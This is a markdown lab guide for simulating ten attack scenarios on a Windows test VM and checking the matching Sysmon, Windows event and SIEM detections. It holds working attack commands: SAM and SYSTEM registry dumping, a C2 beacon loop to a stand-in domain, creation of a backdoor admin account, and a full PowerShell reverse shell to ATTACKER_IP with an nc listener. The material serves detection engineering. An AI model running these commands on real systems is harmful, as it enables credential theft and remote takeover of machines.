# Phase 2 Simulation: Logging & Detection Guide

This document provides a step-by-step guide for simulating all Phase 2 attack scenarios, complete with logging and detection analysis. Use this as a reference for both executing simulations and verifying that logs and SIEM detections are working correctly.

---

## Preparation

### Lab Setup

- **Windows 10/11 VM** (Victim)
- **Kali Linux VM** (Attacker)
- **SIEM** (Wazuh/ELK recommended)
- **Sysmon** + **Winlogbeat** configured on Windows

---

## Simulation Scenarios

### 🔍 1. Suspicious Archive Downloads

**On Windows VM:**
```powershell
Invoke-WebRequest -Uri "http://example.com/suspicious.zip" -OutFile "$env:USERPROFILE\Downloads\malware.zip" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
```

**Check Logs:**
- **Winlogbeat**: HTTP requests with `.zip`/`.rar`
- **Sysmon Event ID 11**: FileCreate

---

### 🔍 2. Malicious PowerShell

**Encode & Execute:**
```powershell
$cmd = "Start-Process calc.exe"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

**Check:**
- **Sysmon Event ID 1**: (Parent: winword.exe if from Office)
- **PowerShell Event ID 4104**: Script block logging

---

### 🔍 3. Credential Dumping

**Simulate Mimikatz-like Activity:**
```powershell
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

**Check:**
- **Event ID 4657**: Registry access
- **Sysmon Event ID 1**: reg.exe execution

---

### 🔍 4. C2 Beaconing

**Scheduled Beacon:**
```powershell
while($true) {
    Invoke-WebRequest -Uri "http://malicious-domain.com/checkin" -UseBasicParsing
    Start-Sleep -Seconds 300
}
```

**Detection:**
- **Firewall logs**: Outbound to external IPs
- **Zeek/Wireshark**: Regular HTTP intervals

---

### 🔍 5. Privilege Escalation

**Create User & Add to Admin:**
```powershell
net user attacker P@ssw0rd! /add
net localgroup administrators attacker /add
```

**Logs:**
- **Event ID 4720**: User added
- **Event ID 4732**: Added to admin group

---

### 🔍 6. RDP Access

**From Kali:**
```bash
xfreerdp /v:Windows_VM_IP /u:attacker /p:P@ssw0rd!
```

**Logs:**
- **Event ID 4624**: Logon Type 10 (RDP)
- **Event ID 4625**: Failed login

---

### 🔍 7. Vulnerability Scan

**On Kali:**
```bash
nmap -sS -T4 Windows_VM_IP
```

**Detection:**
- **Firewall/IDS alerts**
- **Event ID 5157**: Windows Filtering Platform

---

### 🔍 8. Lateral Movement

**From one Windows VM to another:**
```powershell
copy C:\malware.exe \\TARGET_VM\C$\temp\
```

**Logs:**
- **Event ID 5145**: Network share access
- **Sysmon Event ID 3**: Network connection

---

### 🔍 9. Malicious Archive

**Create password-protected ZIP (Kali):**
```bash
zip -P infected malware.zip malware.exe
```

**Execute on Windows:**
```powershell
powershell -c "Expand-Archive -Path malware.zip -DestinationPath C:\temp"
```

**Logs:**
- **AV detection events**
- **Sysmon Event ID 1**: Archive execution

---

### 🔍 10. Reverse Shell

**On Windows (Victim):**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**On Kali (Attacker):**
```bash
nc -lvnp 4444
```

**Detection:**
- **Abnormal parent-child** (e.g., explorer.exe → powershell.exe)
- **Event ID 3**: Outbound connection

---

## Detection Analysis Table

| Hint | Key Logs/Events            | SIEM Query Example                                                   |
|------|--------------------------- |---------------------------------------------------------------------|
| 1    | Winlogbeat HTTP logs       | `event.dataset:"http" AND url.path:"*.zip"`                         |
| 2    | Event ID 4104              | `powershell.event_id:4104 AND message:"*encodedcommand*"`           |
| 3    | Event ID 4657              | `event.code:4657 AND registry.key_path:"HKLM\\SAM"`                 |
| 4    | Firewall logs              | `destination.ip:"malicious-domain.com" AND event.action:"connection_attempt"` |
| 5    | Event ID 4732              | `winlog.event_id:4732 AND user.name:"attacker"`                     |
| 6    | Event ID 4624              | `winlog.event_id:4624 AND logon.type:10`                            |
| 7    | IDS alerts                 | `event.type:"alert" AND tags:"nmap"`                                |
| 8    | Event ID 5145              | `winlog.event_id:5145 AND file.name:"malware.exe"`                  |
| 9    | AV logs                    | `event.module:"antivirus" AND file.extension:"zip"`                 |
| 10   | Netflow data               | `destination.port:4444 AND process.name:"powershell.exe"`           |

---

## Usage

- Place all simulation logs and detection screenshots in this `logs/` directory.
- Use the table above to verify detection for each scenario.
- Document any anomalies or false negatives for review.

---
